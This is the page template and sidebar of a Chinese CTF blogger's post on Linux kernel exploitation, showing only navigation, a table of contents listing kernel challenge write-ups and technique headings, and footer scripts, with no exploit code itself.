            <a href="/tags/LinuxKernel/" rel="tag"><i class="fa fa-tag"></i> LinuxKernel</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2020/04/15/花式shellcode/" rel="next" title="花式shellcode">
                <i class="fa fa-chevron-left"></i> 花式shellcode
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2020/04/28/Glibc2.29笔记/" rel="prev" title="Glibc2.29笔记">
                Glibc2.29笔记 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  
    <div class="comments" id="comments">
    </div>
  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="/images/xxrw.jpg" alt="">
            
              <p class="site-author-name" itemprop="name"></p>
              <p class="site-description motion-element" itemprop="description">Babypwner@Dubhe@BUPT</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives">
              
                  <span class="site-state-item-count">53</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">9</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">24</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/xiaoxiaorenwu" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="mailto:renwuxiaoxiao@126.com" target="_blank" title="E-mail">
                      
                        <i class="fa fa-fw fa-envelope"></i>E-mail</a>
                  </span>
                
            </div>
          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-block">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                大佬们的blog~~
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="http://p4nda.top" title="p4nda" target="_blank">p4nda</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://sunichi.github.io/" title="sunichi" target="_blank">sunichi</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://e3pem.github.io/" title="e3pem" target="_blank">e3pem</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://p1umer.github.io/" title="P1umer" target="_blank">P1umer</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://hpasserby.me/" title="hpasserby" target="_blank">hpasserby</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://ama2in9.top/" title="ama2in9" target="_blank">ama2in9</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://t3ls.club/" title="T3LS" target="_blank">T3LS</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://www.pwn4fun.com/" title="Railgun" target="_blank">Railgun</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言："><span class="nav-number">1.</span> <span class="nav-text">前言：</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#pwn中kernel题的常规套路："><span class="nav-number">2.</span> <span class="nav-text">pwn中kernel题的常规套路：</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#前置知识："><span class="nav-number">3.</span> <span class="nav-text">前置知识：</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#对一些重要结构体和函数的理解："><span class="nav-number">3.1.</span> <span class="nav-text">对一些重要结构体和函数的理解：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#FOP-File-Operations-："><span class="nav-number">3.1.1.</span> <span class="nav-text">FOP( File_Operations )：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#proc-create创建文件："><span class="nav-number">3.1.2.</span> <span class="nav-text">proc_create创建文件：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#kptr-restrict-与dmesg-restrict："><span class="nav-number">3.1.3.</span> <span class="nav-text">kptr_restrict 与dmesg_restrict：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#关于基址："><span class="nav-number">3.1.4.</span> <span class="nav-text">关于基址：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#关于gdb-qemu调试："><span class="nav-number">4.</span> <span class="nav-text">关于gdb+qemu调试：</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#我自己的常规流程："><span class="nav-number">4.1.</span> <span class="nav-text">我自己的常规流程：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#qemu内："><span class="nav-number">4.1.1.</span> <span class="nav-text">qemu内：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#qemu外，gdb内："><span class="nav-number">4.1.2.</span> <span class="nav-text">qemu外，gdb内：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#qemu内：-1"><span class="nav-number">4.1.3.</span> <span class="nav-text">qemu内：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#qemu外，gdb内：-1"><span class="nav-number">4.1.4.</span> <span class="nav-text">qemu外，gdb内：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#确定ko模块基址："><span class="nav-number">4.2.</span> <span class="nav-text">确定ko模块基址：</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2017CSICN-babydriver"><span class="nav-number">5.</span> <span class="nav-text">2017CSICN_babydriver:</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#解法一："><span class="nav-number">5.1.</span> <span class="nav-text">解法一：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp："><span class="nav-number">5.2.</span> <span class="nav-text">exp：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#解法二："><span class="nav-number">5.3.</span> <span class="nav-text">解法二：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp：-1"><span class="nav-number">5.4.</span> <span class="nav-text">exp：</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2018强网杯-core："><span class="nav-number">6.</span> <span class="nav-text">2018强网杯_core：</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#解法一：-1"><span class="nav-number">6.1.</span> <span class="nav-text">解法一：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp：-2"><span class="nav-number">6.2.</span> <span class="nav-text">exp：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#解法二：-1"><span class="nav-number">6.3.</span> <span class="nav-text">解法二：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp：-3"><span class="nav-number">6.4.</span> <span class="nav-text">exp：</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2015CSAW-stringipc"><span class="nav-number">7.</span> <span class="nav-text">2015CSAW_stringipc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#解法一：-2"><span class="nav-number">7.1.</span> <span class="nav-text">解法一：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#task-struct-amp-amp-thread-info-amp-amp-cred："><span class="nav-number">7.1.1.</span> <span class="nav-text">task_struct &amp;&amp; thread_info &amp;&amp; cred：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp：-4"><span class="nav-number">7.2.</span> <span class="nav-text">exp：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#解法二：-2"><span class="nav-number">7.3.</span> <span class="nav-text">解法二：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#反弹shell："><span class="nav-number">7.3.1.</span> <span class="nav-text">反弹shell：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dump-vDSO："><span class="nav-number">7.3.2.</span> <span class="nav-text">dump_vDSO：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp：-5"><span class="nav-number">7.4.</span> <span class="nav-text">exp：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#解法三："><span class="nav-number">7.5.</span> <span class="nav-text">解法三：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#寻找偏移："><span class="nav-number">7.5.1.</span> <span class="nav-text">寻找偏移：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#有源码："><span class="nav-number">7.5.1.1.</span> <span class="nav-text">有源码：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#无源码："><span class="nav-number">7.5.1.2.</span> <span class="nav-text">无源码：</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#反弹shell：-1"><span class="nav-number">7.5.2.</span> <span class="nav-text">反弹shell：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#reverse-shell："><span class="nav-number">7.6.</span> <span class="nav-text">reverse_shell：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp：-6"><span class="nav-number">7.7.</span> <span class="nav-text">exp：</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2018强网杯-solidcore"><span class="nav-number">8.</span> <span class="nav-text">2018强网杯_solidcore</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#20180CTF-FINAL-babykernel"><span class="nav-number">9.</span> <span class="nav-text">20180CTF-FINAL_babykernel</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#思路："><span class="nav-number">9.1.</span> <span class="nav-text">思路：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp：-7"><span class="nav-number">9.2.</span> <span class="nav-text">exp：</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2019TSCTF-babykernel："><span class="nav-number">10.</span> <span class="nav-text">2019TSCTF_babykernel：</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#思路：-1"><span class="nav-number">10.1.</span> <span class="nav-text">思路：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp：-8"><span class="nav-number">10.2.</span> <span class="nav-text">exp：</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2019云安全线下rw-docker："><span class="nav-number">11.</span> <span class="nav-text">2019云安全线下rw_docker：</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#–privileged"><span class="nav-number">11.1.</span> <span class="nav-text">–privileged</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp：-9"><span class="nav-number">11.2.</span> <span class="nav-text">exp：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#另一种解法："><span class="nav-number">11.3.</span> <span class="nav-text">另一种解法：</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2019-CTF-hackme"><span class="nav-number">12.</span> <span class="nav-text">2019*CTF_hackme</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#初始解法："><span class="nav-number">12.1.</span> <span class="nav-text">初始解法：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp：-10"><span class="nav-number">12.2.</span> <span class="nav-text">exp：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#其他解法一："><span class="nav-number">12.3.</span> <span class="nav-text">其他解法一：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#modprobe-path"><span class="nav-number">12.3.1.</span> <span class="nav-text">modprobe_path</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp：-11"><span class="nav-number">12.4.</span> <span class="nav-text">exp：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#其他解法二："><span class="nav-number">12.5.</span> <span class="nav-text">其他解法二：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#tty-struct-amp-amp-栈迁移："><span class="nav-number">12.5.1.</span> <span class="nav-text">tty_struct &amp;&amp; 栈迁移：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp：-12"><span class="nav-number">12.6.</span> <span class="nav-text">exp：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#其他解法三："><span class="nav-number">12.7.</span> <span class="nav-text">其他解法三：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#userfaultfd："><span class="nav-number">12.7.1.</span> <span class="nav-text">userfaultfd：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp：-13"><span class="nav-number">12.8.</span> <span class="nav-text">exp：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#其他解法四："><span class="nav-number">12.9.</span> <span class="nav-text">其他解法四：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#race："><span class="nav-number">12.9.1.</span> <span class="nav-text">race：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp：-14"><span class="nav-number">12.10.</span> <span class="nav-text">exp：</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2019SuCTF-sudrv"><span class="nav-number">13.</span> <span class="nav-text">2019SuCTF_sudrv</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#解法一：-3"><span class="nav-number">13.1.</span> <span class="nav-text">解法一：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp：-15"><span class="nav-number">13.2.</span> <span class="nav-text">exp：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#解法二：-3"><span class="nav-number">13.3.</span> <span class="nav-text">解法二：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp：-16"><span class="nav-number">13.4.</span> <span class="nav-text">exp：</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2019BalsnCTF-KrazyNote"><span class="nav-number">14.</span> <span class="nav-text">2019BalsnCTF_KrazyNote</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#解法一：-4"><span class="nav-number">14.1.</span> <span class="nav-text">解法一：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp：-17"><span class="nav-number">14.2.</span> <span class="nav-text">exp：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#解法二：-4"><span class="nav-number">14.3.</span> <span class="nav-text">解法二：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp：-18"><span class="nav-number">14.4.</span> <span class="nav-text">exp：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#解法三：-1"><span class="nav-number">14.5.</span> <span class="nav-text">解法三：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp：-19"><span class="nav-number">14.6.</span> <span class="nav-text">exp：</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2019DelCTF-race："><span class="nav-number">15.</span> <span class="nav-text">2019DelCTF_race：</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#续："><span class="nav-number">15.1.</span> <span class="nav-text">续：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#challenge1："><span class="nav-number">15.1.1.</span> <span class="nav-text">challenge1：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#challenge2："><span class="nav-number">15.1.2.</span> <span class="nav-text">challenge2：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#challenge3："><span class="nav-number">15.1.3.</span> <span class="nav-text">challenge3：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#challenge4："><span class="nav-number">15.1.4.</span> <span class="nav-text">challenge4：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#challenge5："><span class="nav-number">15.1.5.</span> <span class="nav-text">challenge5：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#最终exp："><span class="nav-number">15.2.</span> <span class="nav-text">最终exp：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#反思："><span class="nav-number">15.3.</span> <span class="nav-text">反思：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#反思exp："><span class="nav-number">15.4.</span> <span class="nav-text">反思exp：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#再次反思："><span class="nav-number">15.5.</span> <span class="nav-text">再次反思：</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2019KCTF-T11：绝地反击"><span class="nav-number">16.</span> <span class="nav-text">2019KCTF_T11：绝地反击</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#思路：-2"><span class="nav-number">16.1.</span> <span class="nav-text">思路：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp：-20"><span class="nav-number">16.2.</span> <span class="nav-text">exp：</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2019XMAN-babykernel"><span class="nav-number">17.</span> <span class="nav-text">2019XMAN_babykernel</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#思路：-3"><span class="nav-number">17.1.</span> <span class="nav-text">思路：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp：-21"><span class="nav-number">17.2.</span> <span class="nav-text">exp：</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2019Xnuca-babykernel"><span class="nav-number">18.</span> <span class="nav-text">2019Xnuca_babykernel</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#思路：-4"><span class="nav-number">18.1.</span> <span class="nav-text">思路：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp：-22"><span class="nav-number">18.2.</span> <span class="nav-text">exp：</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2019xctf新春战疫-babyhacker2"><span class="nav-number">19.</span> <span class="nav-text">2019xctf新春战疫_babyhacker2</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#exp"><span class="nav-number">19.1.</span> <span class="nav-text">exp:</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2019xctf新春战疫-kernoob"><span class="nav-number">20.</span> <span class="nav-text">2019xctf新春战疫_kernoob</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#分析："><span class="nav-number">20.1.</span> <span class="nav-text">分析：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#解法一：-5"><span class="nav-number">20.2.</span> <span class="nav-text">解法一：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#思路：-5"><span class="nav-number">20.2.1.</span> <span class="nav-text">思路：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp：-23"><span class="nav-number">20.2.2.</span> <span class="nav-text">exp：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#解法二：-5"><span class="nav-number">20.3.</span> <span class="nav-text">解法二：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#思路：-6"><span class="nav-number">20.3.1.</span> <span class="nav-text">思路：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp：-24"><span class="nav-number">20.3.2.</span> <span class="nav-text">exp：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#20190CTF-FINAL-Fast-amp-Furious"><span class="nav-number">21.</span> <span class="nav-text">20190CTF-FINAL_Fast&amp;Furious</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#20190CTF-FINAL-Fast-amp-Furious2"><span class="nav-number">22.</span> <span class="nav-text">20190CTF-FINAL_Fast&amp;Furious2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2019N1CTF-babykernel"><span class="nav-number">23.</span> <span class="nav-text">2019N1CTF_babykernel</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2019Hack-lu-babykernel2"><span class="nav-number">24.</span> <span class="nav-text">2019Hack.lu_babykernel2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2019TeaserCONFidence-p4fmt"><span class="nav-number">25.</span> <span class="nav-text">2019TeaserCONFidence_p4fmt</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#20170CTF-knote"><span class="nav-number">26.</span> <span class="nav-text">20170CTF_knote</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#20180CTF-zerofs"><span class="nav-number">27.</span> <span class="nav-text">20180CTF_zerofs</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2018WCTF-klist"><span class="nav-number">28.</span> <span class="nav-text">2018WCTF_klist</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#思路：-7"><span class="nav-number">28.1.</span> <span class="nav-text">思路：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#关于堆喷："><span class="nav-number">28.2.</span> <span class="nav-text">关于堆喷：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#pipe"><span class="nav-number">28.2.1.</span> <span class="nav-text">pipe</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#msgsnd"><span class="nav-number">28.2.2.</span> <span class="nav-text">msgsnd</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sendmsg"><span class="nav-number">28.2.3.</span> <span class="nav-text">sendmsg</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp：-25"><span class="nav-number">28.3.</span> <span class="nav-text">exp：</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2019D-3CTF-Knote-V2"><span class="nav-number">29.</span> <span class="nav-text">2019D^3CTF_Knote_V2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2019TWCTF-Gnote"><span class="nav-number">30.</span> <span class="nav-text">2019TWCTF_Gnote</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#待续。。。"><span class="nav-number">31.</span> <span class="nav-text">待续。。。</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#其他"><span class="nav-number">32.</span> <span class="nav-text">其他</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#tyy-struct-amp-amp-tty-operations："><span class="nav-number">32.1.</span> <span class="nav-text">tyy_struct &amp;&amp; tty_operations：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cred-amp-amp-task-struct-amp-amp-thread-info-amp-amp-内核stack："><span class="nav-number">32.2.</span> <span class="nav-text">cred &amp;&amp; task_struct &amp;&amp; thread_info &amp;&amp; 内核stack：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#vDSO："><span class="nav-number">32.3.</span> <span class="nav-text">vDSO：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#prctl："><span class="nav-number">32.4.</span> <span class="nav-text">prctl：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#32位："><span class="nav-number">32.4.1.</span> <span class="nav-text">32位：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#64位："><span class="nav-number">32.4.2.</span> <span class="nav-text">64位：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#call-usermodehelper："><span class="nav-number">32.5.</span> <span class="nav-text">call_usermodehelper：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#userfaultfd：-1"><span class="nav-number">32.6.</span> <span class="nav-text">userfaultfd：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#race：-1"><span class="nav-number">32.7.</span> <span class="nav-text">race：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#内核利用的核心："><span class="nav-number">32.8.</span> <span class="nav-text">内核利用的核心：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#内存映射："><span class="nav-number">32.9.</span> <span class="nav-text">内存映射：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#打远程的脚本："><span class="nav-number">32.10.</span> <span class="nav-text">打远程的脚本：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#保护机制："><span class="nav-number">32.11.</span> <span class="nav-text">保护机制：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#smep-PNX-amp-smap："><span class="nav-number">32.11.1.</span> <span class="nav-text">smep/PNX &amp; smap：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#KASLR："><span class="nav-number">32.11.2.</span> <span class="nav-text">KASLR：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#KPTI："><span class="nav-number">32.11.3.</span> <span class="nav-text">KPTI：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SLUB分配器："><span class="nav-number">32.12.</span> <span class="nav-text">SLUB分配器：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#知识积累："><span class="nav-number">32.13.</span> <span class="nav-text">知识积累：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#linuxkernel完善教程"><span class="nav-number">32.13.1.</span> <span class="nav-text">linuxkernel完善教程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#open的第2-3个参数"><span class="nav-number">32.13.2.</span> <span class="nav-text">open的第2/3个参数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#系统调用入口及接口"><span class="nav-number">32.13.3.</span> <span class="nav-text">系统调用入口及接口</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#笔记："><span class="nav-number">32.14.</span> <span class="nav-text">笔记：</span></a></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      
        <div class="back-to-top">
          <i class="fa fa-arrow-up"></i>
          
            <span id="scrollpercent"><span>0</span>%</span>
          
        </div>
      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder"></span>

  
</div>









        
<div class="busuanzi-count">
  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
  </script>
  
    <span class="site-uv">
      访客数
      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
      人
    </span>
  

  
    <span class="site-pv">
      总访问量
      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
      次
    </span>
  
</div>








        
      </div>
    </footer>

    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  










  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
  
  <script type="text/javascript">
    var GUEST = ['nick','mail','link'];
    var guest = 'nick,mail,link';
    guest = guest.split(',').filter(item=>{
      return GUEST.indexOf(item)>-1;
    });
    new Valine({
        el: '#comments' ,
        verify: false,
        notify: false,
        appId: 'wQR3fxNYiFB3Sh2MdPvjK8ez-gzGzoHsz',
        appKey: 'M81KRpr3NUHCSrwBJ9TY73HF',
        placeholder: '欢乐时光就要开始了',
        avatar:'mm',
        guest_info:guest,
        pageSize:'10' || 10,
    });
  </script>



  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
